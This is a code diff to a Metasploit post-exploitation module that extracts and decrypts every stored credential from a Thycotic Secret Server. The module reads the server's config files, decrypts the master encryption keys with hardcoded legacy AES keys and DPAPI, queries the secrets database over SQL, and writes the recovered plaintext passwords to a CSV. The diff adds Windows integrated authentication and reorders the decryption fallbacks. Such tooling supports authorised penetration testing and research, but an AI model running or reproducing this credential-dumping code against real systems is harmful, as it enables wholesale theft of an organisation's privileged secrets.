@@ -156,7 +156,11 @@ class MetasploitModule < Msf::Post
       sql_query = 'SET NOCOUNT ON;SELECT s.SecretID,s.Active,CONVERT(VARBINARY(256),t.SecretTypeName) SecretType,CONVERT(VARBINARY(256),s.SecretName) SecretName,i.IsEncrypted,i.IsSalted,i.Use256Key,CONVERT(VARBINARY(256),f.SecretFieldName) SecretFieldName,s.[Key],s.IvMEK,i.ItemValue,i.ItemValue2,i.IV FROM tbSecretItem AS i JOIN tbSecret AS s ON (s.SecretID=i.SecretID) JOIN tbSecretField AS f ON (i.SecretFieldID=f.SecretFieldID) JOIN tbSecretType AS t ON (s.SecretTypeId=t.SecretTypeID)'
       export_header_row = export_header_row_modern
     end
-    sql_cmd = "#{@sql_client} -d \"#{@ss_db_name}\" -S #{@ss_db_instance_path} -U \"#{@ss_db_user}\" -P \"#{@ss_db_pass}\" -Q \"#{sql_query}\" -h-1 -s\",\" -w 65535 -W -I"
+    if @ss_db_integrated_auth
+      sql_cmd = "#{@sql_client} -d \"#{@ss_db_name}\" -S #{@ss_db_instance_path} -E -Q \"#{sql_query}\" -h-1 -s\",\" -w 65535 -W -I"
+    else
+      sql_cmd = "#{@sql_client} -d \"#{@ss_db_name}\" -S #{@ss_db_instance_path} -U \"#{@ss_db_user}\" -P \"#{@ss_db_pass}\" -Q \"#{sql_query}\" -h-1 -s\",\" -w 65535 -W -I"
+    end
     print_status('Export Secret Server DB ...')
     query_result = cmd_exec(sql_cmd)
     csv = CSV.parse(query_result.gsub("\r", ''), row_sep: :auto, headers: export_header_row, quote_char: "\x00", skip_blanks: true)
@@ -185,7 +189,7 @@ class MetasploitModule < Msf::Post
       secret_field = [row['SecretFieldName'][2..]].pack('H*')
       secret_ciphertext_1 = row['ItemValue']
       if secret_ciphertext_1.nil?
-        vprint_warning("SecretID #{secret_id} field #{secret_field} ItemValue nil, excluding")
+        vprint_warning("SecretID #{secret_id} field '#{secret_field}' ItemValue column nil, excluding")
         blank_rows += 1
         next
       end
@@ -221,7 +225,7 @@ class MetasploitModule < Msf::Post
       if secret_encrypted == 1
         secret_plaintext_1 = thycotic_secret_decrypt(secret_id: secret_id, secret_field: secret_field, secret_value: value_1, secret_key: key, secret_iv: iv, secret_miv: miv, secret_use256: secret_use256, secret_salted: secret_salted)
         if secret_plaintext_1.nil?
-          vprint_warning("SecretID #{secret_id} field #{secret_field} ItemValue nil, excluding")
+          vprint_warning("SecretID #{secret_id} field '#{secret_field}' decrypted ItemValue nil, excluding")
           blank_rows += 1
           next
         end
@@ -229,7 +233,7 @@ class MetasploitModule < Msf::Post
         # For now just return ciphertext if it exists.
         secret_plaintext_2 = secret_ciphertext_2
         if !secret_plaintext_1 || !secret_plaintext_2
-          print_error("SecretID #{secret_id} field #{secret_field} failed to decrypt")
+          print_error("SecretID #{secret_id} field '#{secret_field}' failed to decrypt")
           vprint_error(row.to_s)
           failed_rows += 1
           next
@@ -238,11 +242,6 @@ class MetasploitModule < Msf::Post
         decrypted_rows += 1
       else
         secret_plaintext_1 = secret_ciphertext_1
-        if secret_plaintext_1.nil?
-          vprint_warning("SecretID #{secret_id} field #{secret_field} ItemValue nil, excluding")
-          blank_rows += 1
-          next
-        end
         secret_plaintext_2 = secret_ciphertext_2
         secret_disposition = 'plaintext'
         plaintext_rows += 1
@@ -251,9 +250,9 @@ class MetasploitModule < Msf::Post
         result_line = [secret_id.to_s, secret_active.to_s, secret_type.to_s, secret_name.to_s, secret_field.to_s, secret_plaintext_1.to_s, secret_plaintext_2.to_s]
         result_row = CSV.parse_line(CSV.generate_line(result_line).gsub("\r", ''))
         result_csv << result_row
-        vprint_status("SecretID #{secret_id} field #{secret_field} ItemValue recovered: #{secret_disposition}")
+        vprint_status("SecretID #{secret_id} field '#{secret_field}' ItemValue recovered: #{secret_disposition}")
       else
-        vprint_warning("SecretID #{secret_id} field #{secret_field} ItemValue empty, excluding")
+        vprint_warning("SecretID #{secret_id} field '#{secret_field}' recovered ItemValue empty, excluding")
         blank_rows += 1
       end
     end
@@ -305,12 +304,21 @@ class MetasploitModule < Msf::Post
   end
 
   def get_secretserver_version
-    version_sql_cmd = "#{@sql_client} -d \"#{@ss_db_name}\" -S #{@ss_db_instance_path} -U \"#{@ss_db_user}\" -P \"#{@ss_db_pass}\" -Q \"
-      SET NOCOUNT ON;
-      SELECT TOP 1 CONVERT(INT,REVERSE(PARSENAME(REPLACE(REVERSE(VersionNumber), ',', '.'), 1))) AS [Major],
-      CONVERT(INT,REVERSE(PARSENAME(REPLACE(REVERSE(VersionNumber), ',', '.'), 2))) AS [Minor],
-      CONVERT(INT,REVERSE(PARSENAME(REPLACE(REVERSE(VersionNumber), ',', '.'), 3))) AS [Rev]
-      FROM tbVersion ORDER BY [Major] DESC, [Minor] DESC, [Rev] DESC\" -h-1 -s\",\" -w 65535 -W -I"
+    if @ss_db_integrated_auth
+      version_sql_cmd = "#{@sql_client} -d \"#{@ss_db_name}\" -S #{@ss_db_instance_path} -E -Q \"
+        SET NOCOUNT ON;
+        SELECT TOP 1 CONVERT(INT,REVERSE(PARSENAME(REPLACE(REVERSE(VersionNumber), ',', '.'), 1))) AS [Major],
+        CONVERT(INT,REVERSE(PARSENAME(REPLACE(REVERSE(VersionNumber), ',', '.'), 2))) AS [Minor],
+        CONVERT(INT,REVERSE(PARSENAME(REPLACE(REVERSE(VersionNumber), ',', '.'), 3))) AS [Rev]
+        FROM tbVersion ORDER BY [Major] DESC, [Minor] DESC, [Rev] DESC\" -h-1 -s\",\" -w 65535 -W -I"
+    else
+      version_sql_cmd = "#{@sql_client} -d \"#{@ss_db_name}\" -S #{@ss_db_instance_path} -U \"#{@ss_db_user}\" -P \"#{@ss_db_pass}\" -Q \"
+        SET NOCOUNT ON;
+        SELECT TOP 1 CONVERT(INT,REVERSE(PARSENAME(REPLACE(REVERSE(VersionNumber), ',', '.'), 1))) AS [Major],
+        CONVERT(INT,REVERSE(PARSENAME(REPLACE(REVERSE(VersionNumber), ',', '.'), 2))) AS [Minor],
+        CONVERT(INT,REVERSE(PARSENAME(REPLACE(REVERSE(VersionNumber), ',', '.'), 3))) AS [Rev]
+        FROM tbVersion ORDER BY [Major] DESC, [Minor] DESC, [Rev] DESC\" -h-1 -s\",\" -w 65535 -W -I"
+    end
     version_query_result = cmd_exec(version_sql_cmd).gsub("\r", '')
     csv = CSV.parse(version_query_result.gsub("\r", ''), row_sep: :auto, headers: 'Major,Minor,Rev', quote_char: "\x00", skip_blanks: true)
     fail_with(Msf::Exploit::Failure::NoTarget, 'Error parsing SQL dataset into CSV format') unless csv
@@ -318,12 +326,13 @@ class MetasploitModule < Msf::Post
     ss_build_minor = csv['Minor'].first.to_i
     ss_build_rev = csv['Rev'].first.to_i
     @ss_build = "#{ss_build_major}.#{ss_build_minor}.#{ss_build_rev}".to_f
+    fail_with(Msf::Exploit::Failure::Unknown, 'Error determining Secret Server version from SQL query') unless @ss_build > 0
     print_status("Secret Server Build #{@ss_build}")
     print_warning('This module has not been tested against Secret Server versions below 8.4 and may not work') if @ss_build < 8.4
   end
 
   def read_config_file(ss_config_file)
-    fail_with(Msf::Exploit::Failure::NoTarget, "#{ss_config_file} not found") unless file_exist?(ss_config_file)
+    fail_with(Msf::Exploit::Failure::NotFound, "#{ss_config_file} not found") unless file_exist?(ss_config_file)
     read_file(ss_config_file)
   end
 
@@ -338,7 +347,7 @@ class MetasploitModule < Msf::Post
       vprint_status('Using Legacy (AES-128) file decryption routine')
       enc_conf = thycotic_encryption_config_decrypt_legacy(ss_enc_conf_bytes)
     end
-    fail_with(Msf::Exploit::Failure::NoTarget, 'Failed to decrypt encryption.config') unless enc_conf
+    fail_with(Msf::Exploit::Failure::Unknown, 'Failed to decrypt encryption.config') unless enc_conf
     ss_key_hex = enc_conf['KEY']
     ss_key256_hex = enc_conf['KEY256']
     ss_iv_hex = enc_conf['IV']
@@ -347,7 +356,7 @@ class MetasploitModule < Msf::Post
       ss_key_hex = dpapi_decrypt(ss_key_hex)
       ss_key256_hex = dpapi_decrypt(ss_key256_hex)
     end
-    fail_with(Msf::Exploit::Failure::NoTarget, "Failed to recover Master Encryption Key values from #{ss_enc_config_file}") if ss_key_hex.nil? || ss_key256_hex.nil? || ss_iv_hex.nil?
+    fail_with(Msf::Exploit::Failure::Unknown, "Failed to recover Master Encryption Key values from #{ss_enc_config_file}") if ss_key_hex.nil? || ss_key256_hex.nil? || ss_iv_hex.nil?
     @ss_iv = [ss_iv_hex].pack('H*')
     @ss_key = [ss_key_hex].pack('H*')
     @ss_key256 = [ss_key256_hex].pack('H*')
@@ -418,9 +427,8 @@ class MetasploitModule < Msf::Post
     aes_key_legacy = ['020216980119760c0b79017097830b1d'].pack('H*')
     aes_iv_legacy = ['7a790a22020b6eb3630cdd080310d40a'].pack('H*')
     ciphertext_bytes = enc_conf_bytes
-    return false unless (plaintext_conf = aes_cbc_decrypt(ciphertext_bytes, aes_key_legacy, aes_iv_legacy))
+    return false unless (plaintext_conf = aes_cbc_decrypt(ciphertext_bytes, aes_key_legacy, aes_iv_legacy).delete("\000"))
 
-    plaintext_conf = plaintext_conf.delete("\000")
     working_offset = (plaintext_conf.unpack('H*').first.downcase.index(/4b65790556616c7565/) / 2) + 14 # magic bytes
     loop do
       k = nil
@@ -454,28 +462,41 @@ class MetasploitModule < Msf::Post
     db_name = db_conf['INITIAL CATALOG']
     db_user = db_conf['USER ID']
     db_pass = db_conf['PASSWORD']
-    fail_with(Msf::Exploit::Failure::NoTarget, "Failed to recover database parameters from #{ss_db_config_file}") if db_instance_path.nil? || db_name.nil? || db_user.nil? || db_pass.nil?
+    db_auth = db_conf['INTEGRATED SECURITY']
+    fail_with(Msf::Exploit::Failure::NoTarget, "Failed to recover database parameters from #{ss_db_config_file}") if db_instance_path.nil? || db_name.nil?
     @ss_db_instance_path = db_instance_path
     @ss_db_name = db_name
-    @ss_db_user = db_user
-    @ss_db_pass = db_pass
-    extra_service_data = {
-      address: Rex::Socket.getaddress(rhost),
-      port: 1433,
-      service_name: 'mssql',
-      protocol: 'tcp',
-      workspace_id: myworkspace_id,
-      module_fullname: fullname,
-      origin_type: :service,
-      realm_key: Metasploit::Model::Realm::Key::WILDCARD,
-      realm_value: @ss_db_instance_path
-    }
-    store_valid_credential(user: @ss_db_user, private: @ss_db_pass, service_data: extra_service_data)
     print_good('Secret Server SQL Database Connection Configuration:')
     print_good("\tInstance Name: #{@ss_db_instance_path}")
     print_good("\tDatabase Name: #{@ss_db_name}")
-    print_good("\tDatabase User: #{@ss_db_user}")
-    print_good("\tDatabase Pass: #{@ss_db_pass}")
+    @ss_db_integrated_auth = false
+    if !db_auth.nil?
+      @ss_db_integrated_auth = true unless db_auth.downcase != 'true'
+    elsif !db_user.nil? && !db_pass.nil?
+      @ss_db_user = db_user
+      @ss_db_pass = db_pass
+      extra_service_data = {
+        address: Rex::Socket.getaddress(rhost),
+        port: 1433,
+        service_name: 'mssql',
+        protocol: 'tcp',
+        workspace_id: myworkspace_id,
+        module_fullname: fullname,
+        origin_type: :service,
+        realm_key: Metasploit::Model::Realm::Key::WILDCARD,
+        realm_value: @ss_db_instance_path
+      }
+      store_valid_credential(user: @ss_db_user, private: @ss_db_pass, service_data: extra_service_data)
+      print_good("\tDatabase User: #{@ss_db_user}")
+      print_good("\tDatabase Pass: #{@ss_db_pass}")
+    else
+      fail_with(Msf::Exploit::Failure::NoTarget, "Could not extract SQL login information from #{ss_db_config_file}")
+    end
+    if @ss_db_integrated_auth
+      print_good("\tDatabase User: (Windows Integrated)")
+      print_warning('The database uses Windows authentication')
+      print_warning('Your Meterpreter username / session identity must have access to the SQL server instance to proceed')
+    end
   end
 
   def get_thycotic_database_config(db_conf_bytes)
@@ -519,22 +540,22 @@ class MetasploitModule < Msf::Post
     else
       mek = @ss_key
     end
-    if secret_salted == 1
-      salted = true
+    if @ss_build > 8.7 && secret_salted == 1
+      intermediate_key = aes_cbc_decrypt(secret_key, mek, secret_miv)
+    elsif @ss_build > 8.7
+      intermediate_key = secret_key
     else
-      salted = false
+      intermediate_key = mek
     end
-    vprint_status("SecretID #{secret_id} field #{secret_field} AES-#{mek.length * 8} salted: #{salted}")
-    intermediate_key = aes_cbc_decrypt(secret_key, mek, secret_miv)
     if intermediate_key
       decrypted_secret = aes_cbc_decrypt(secret_value, intermediate_key, secret_iv)
     else
-      vprint_warning("SecretID #{secret_id} field #{secret_field} intermediate key decryption failed, attempting MEK decryption")
-      decrypted_secret = aes_cbc_decrypt(secret_value, mek, secret_iv)
+      vprint_warning("SecretID #{secret_id} field '#{secret_field}' decryption failed, attempting ItemKey decryption")
+      decrypted_secret = aes_cbc_decrypt(secret_value, secret_key, secret_iv)
     end
     unless decrypted_secret
-      vprint_warning("SecretID #{secret_id} field #{secret_field} MEK decryption failed, attempting ItemKey decryption")
-      decrypted_secret = aes_cbc_decrypt(secret_value, secret_key, secret_iv)
+      vprint_warning("SecretID #{secret_id} field '#{secret_field}' decryption failed, attempting MEK decryption")
+      decrypted_secret = aes_cbc_decrypt(secret_value, mek, secret_iv)
     end
     return false unless decrypted_secret
 
@@ -547,8 +568,8 @@ class MetasploitModule < Msf::Post
       # Catch where decryption did not throw an exception but produced invalid UTF-8 plaintext
       # This was evident in a few test cases where the secret value appeared to have been pasted from Microsoft Word
       if !plaintext.force_encoding('UTF-8').valid_encoding?
-        plaintext = Base64.strict_encode64(decrypted_secret.delete("\000")[4..])
-        print_warning("SecretID #{secret_id} field #{secret_field} contains invalid UTF-8 and will be stored as a Base64 string in the output file")
+        plaintext = Base64.strict_encode64(plaintext)
+        print_warning("SecretID #{secret_id} field '#{secret_field}' contains invalid UTF-8 and will be stored as a Base64 string in the output file")
       end
       return plaintext
     else
